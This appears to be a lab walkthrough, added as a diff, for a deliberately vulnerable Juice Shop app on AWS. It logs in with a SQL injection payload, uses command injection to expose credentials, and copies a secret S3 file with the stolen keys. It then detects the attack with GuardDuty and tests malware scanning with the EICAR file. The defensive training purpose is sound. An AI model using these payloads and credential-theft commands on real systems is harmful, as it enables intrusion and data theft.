@@ -1,0 +1,116 @@
+A. Deploy a Web Application
+	Deploy a web app using CloudFormation Template.
+	1. Open AWS Management Console.	
+	2. Search, Open CloudFormation console.
+	3. Create stack.	
+	4. Select With new resources (standard)
+	5. Select existing template. 
+	6. Upload a template file.
+		- CloudFormation template.
+	7. Provide Stack name.
+	8. Skip Parameters, Tags, and Permissions.
+	9. Stack Failure options.
+		- Roll back all stack resources.
+		- Delete newly created resources during a rollback.
+	10. Check acknowledge.
+	11. Review settings.
+		- Prerequisite - Prepare template "Template is ready"
+		- Template URL
+		- Stack description
+		- Stack name	
+		- Parameters
+		- Stack failure options - both settings Activated.
+	
+	 12. Wait as CloudFormation process your template and try to deploy your resources.
+	 13. Validate your stack deployment. 
+		- CREATE_COMPLETE
+
+B. Log into the web app.
+	 1. In CloudFromration console, select Outputs tab.
+	 2. Find the JuiceShop URL. Right click, open in new tab.
+	 3. On login page, email page enter ' or 1==1; --
+	 4. Log in successfully! 
+ 	
+C. Exploit the web app.
+	 Steal AWS Credentials.
+	 Access the stolen credentials.
+	 1. Select Account, top right-hand corner.
+	 2. Select admin@juice-sh.op email.
+	 	- Admin's profile page.	
+		- Command injection.
+	 3. You will be redirected to page that the code created, stolen credential.
+	 
+
+D. Steal Data with Stolen Credentials.
+	 Open AWS CloudShell.	
+	 Configure AWL CLI with stolen credentials.
+	 Copy secret file from S3 bucket.
+
+	 1. Go to AWS Management Console, open CloudShell console.
+		- Set up environmental variable for CloudShell, remember the URL pointing to web 		app. 		
+		export JUICESHOPURL="[JuiceShopURL]"
+
+		- Set up environmental variable. Replace the value from CloudFormation
+		export 
+		JUICESHOPS3BUCKET="[TheSecureBucket]"
+
+		- Download and Display Credentials
+		wget $JUICESHOPURL/assets/public/credentials.json
+
+		- Display credentials.
+		cat credentials.json | jq
+
+		- Configure AWS CLI Profile.
+		aws configure set profile.stolen.region us-west-2
+aws configure set profile.stolen.aws_access_key_id `cat credentials.json | jq -r '.AccessKeyId'`
+aws configure set profile.stolen.aws_secret_access_key `cat credentials.json | jq -r '.SecretAccessKey'`
+aws configure set profile.stolen.aws_session_token `cat credentials.json | jq -r '.Token'`
+ 
+		- Copy the Secret File
+		aws s3 cp s3://$JUICESHOPS3BUCKET/secret-information.txt . --profile stolen
+
+ 		
+		-View Secret File
+		cat secret-information.txt
+
+	 2. You now have access to the secret information!
+
+E. Detect the Attack with GuardDuty.
+	Find and analyze GuarDuty Findings.
+	 1. Go to the GuardDuty Console.
+	 	- GuardDuty dashboard showing 1 finding.
+ 	 2. Click Findings.
+	 	- Check Severity: High
+	 
+F. Use S3 Malware Protection.
+	Enable malware protection in Guarduty.
+	1. In GuardDuty, select Malware Protection for S3.
+	2. Select Enable, to start using Malware Protection.
+	3. Select Browse S3 in S3 bucket details.
+	4. Select S3 bucket.
+	5. Set Default or Tag scanned objects and Service Access. 
+	6. Select Enable.
+		- Malware Protection for S3 is now enabled.
+
+	
+	Upload test malware file to S3 bucket.
+        1. Select S3 bucket from Protected buckets panel.
+	2. Select you S3 bucket.
+	3. Download EICAR test file. Save link as EICAR-test-file.txt
+		-EICAR test file is a harmless file that is programmed to make antivirus software 		think it's a malware.
+		-European Institute for Computer Antivirus Research
+		- https://www.eicar.org/download-anti-malware-testfile/
+
+	4. Upload the EICAR test file.
+	
+	Verify GuardDuty Findings.
+	1. Return to GuardDuty console.
+	2. Select View Findings.
+		- GaurdDuty caught the malicious file!
+
+
+	
+
+
+
+	Get to know the resource that make up your web app.
